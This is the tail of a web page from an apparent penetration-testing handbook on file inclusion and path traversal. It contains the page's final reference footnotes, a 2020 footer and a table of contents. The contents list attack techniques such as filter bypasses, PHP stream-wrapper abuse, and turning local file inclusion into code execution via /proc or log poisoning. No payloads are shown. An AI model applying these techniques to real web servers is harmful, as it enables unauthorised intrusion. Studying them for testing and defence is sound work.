href=https://www.kernel.org/doc/html/latest/filesystems/proc.html>https://www.kernel.org/doc/html/latest/filesystems/proc.html</a>. <a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8 role=doc-endnote><p>“Proc(5) - Linux Manual Page.” Michael Kerrisk - Man7.Org, <a href=https://man7.org/linux/man-pages/man5/proc.5.html>https://man7.org/linux/man-pages/man5/proc.5.html</a>. <a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9 role=doc-endnote><p>Bernat, Vincent. “IPv4 Route Lookup on Linux ⁕ Vincent Bernat.” MTU Ninja Vincent Bernat, <a href=https://vincent.bernat.ch/en/blog/2017-ipv4-route-lookup-linux>https://vincent.bernat.ch/en/blog/2017-ipv4-route-lookup-linux</a>. <a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10 role=doc-endnote><p>“LFI2RCE (Local File Inclusion to Remote Code Execution) Advanced Exploitation: /Proc Shortcuts.” Ush.It - a Beautiful Place, <a href=https://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/>https://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/</a>. <a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11 role=doc-endnote><p>“Log Files - Apache HTTP Server Version 2.4.” Welcome! - The Apache HTTP Server Project, <a href=https://httpd.apache.org/docs/2.4/logs.html>https://httpd.apache.org/docs/2.4/logs.html</a>. <a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></article><footer class=book-footer><div class="flex justify-between"><div><a class="flex align-center" href=https://github.com/0xffsec/book/commit/efe1d6d0682a601b0addd749bca6a116c04c45fe title="Last modified by Max Rodrigo | July 16, 2020" target=_blank rel=noopener><img src=/book/svg/calendar.svg class=book-icon alt=Calendar>
+<span>July 16, 2020</span></a></div><div><a class="flex align-center" href=https://github.com/0xffsec/book/edit/master/content//web-applications/file-inclusion-and-path-traversal.md target=_blank rel=noopener><img src=/book/svg/edit.svg class=book-icon alt=Edit>
+<span>Edit this page</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#lfi>LFI</a><ul><li><a href=#basic-lfi>Basic LFI</a></li><li><a href=#null-byte>Null Byte</a></li><li><a href=#dot-truncation>Dot Truncation</a></li><li><a href=#encoding>Encoding</a></li><li><a href=#bypass-filtering>Bypass Filtering</a></li><li><a href=#bypass--removal>Bypass <code>../</code> removal</a></li><li><a href=#bypass--replaced-with->Bypass <code>../</code> replaced with <code>;</code></a></li><li><a href=#windows-unc-share-unc-share>Windows UNC Share</a></li></ul></li><li><a href=#rfi>RFI</a><ul><li><a href=#basic-rfi>Basic RFI</a></li><li><a href=#null-byte-1>Null Byte</a></li><li><a href=#bypass-https-removal>Bypass <code>http(s)://</code> removal</a></li><li><a href=#bypass-allow_url_include>Bypass <code>allow_url_include</code></a></li></ul></li><li><a href=#php-stream-wrappers>PHP Stream Wrappers</a><ul><li><a href=#phpfilter>php://filter</a></li><li><a href=#zip>zip://</a></li><li><a href=#data>data://</a></li><li><a href=#expect>expect://</a></li><li><a href=#phpinput>php://input</a></li></ul></li><li><a href=#the-proc-file-system>The <code>proc</code> File System</a><ul><li></li><li><a href=#useful-proc-entries>Useful <code>/proc</code> entries</a></li><li><a href=#useful-procpid-entries>Useful <code>/proc/[PID]</code> entries</a></li><li><a href=#lfi2rce---proc>LFI2RCE - /proc</a></li></ul></li><li><a href=#lfi2rce---log-poisoning>LFI2RCE - Log Poisoning</a><ul><li><a href=#apache>Apache</a></li><li><a href=#ssh>SSH</a></li><li><a href=#email>Email</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></main></body></html>
